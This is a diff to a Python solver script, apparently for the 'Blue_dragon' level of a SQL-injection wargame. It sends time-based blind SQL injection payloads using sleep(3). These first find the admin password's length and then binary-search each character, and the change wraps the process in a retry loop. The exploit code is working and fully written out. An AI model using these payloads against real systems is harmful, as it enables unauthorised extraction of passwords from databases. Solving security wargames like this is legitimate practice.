@@ -5,8 +5,13 @@ from getpass import getpass
 import time
 
 
-def check_func(response: str, time_1, time_2) -> bool:
-    return time_2 - time_1 > 2
+def check_func(*args) -> bool:
+    '''
+    check time for request
+    args[2]: time before request
+    args[1]: time after request
+    '''
+    return args[2] - args[1] > 2
 
 
 def main():
@@ -41,30 +46,32 @@ def main():
         print('you need to login in browser')
         exit(1)
 
-    payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
-    param = dict(pw=payload)
-    len_of_key = los.find_key_len(url, param, check_func, cook)
+    final_response = ''
+    while 'Clear!' not in final_response:
 
-    print(len_of_key)
-
-    result = ''
-    num_of_requests = 0
-    for i in range(1, len_of_key + 1):
-        payload = f"' or id='admin' and if(ord(mid(pw,{i},1))<%s,sleep(3),0)#"
+        payload = "' or id='admin' and if(length(pw)>%s,sleep(3),0)#"
         param = dict(pw=payload)
-        left, num_requests = los.find_binary(url, param, check_func,
-                                             32, 127, cook)
-        print(chr(left))
-        result += chr(left)
-        num_of_requests += num_requests
+        len_of_key = los.find_key_len(url, param, check_func, cook)
 
-    print('num_of_requests:', num_of_requests)
+        print(len_of_key)
 
-    param = {'id': 'admin', 'pw': result}
-    response = los.get_request(url, param, cook)
+        result = ''
+        num_of_requests = 0
+        for i in range(1, len_of_key + 1):
+            payload = f"' or id='admin' and if(ord(mid(pw,{i},1))<%s,sleep(3),0)#"
+            param = dict(pw=payload)
+            left, num_requests = los.find_binary(url, param, check_func,
+                                                 32, 127, cook)
+            print(chr(left))
+            result += chr(left)
+            num_of_requests += num_requests
 
-    if 'Clear!' in response:
-        print('Blue_dragon Clear!')
+        print('num_of_requests:', num_of_requests)
+
+        param = {'id': 'admin', 'pw': result}
+        final_response = los.get_request(url, param, cook)
+
+    print('Blue_dragon Clear!')
 
     # Save cookie
     los.save_cookies(cook)
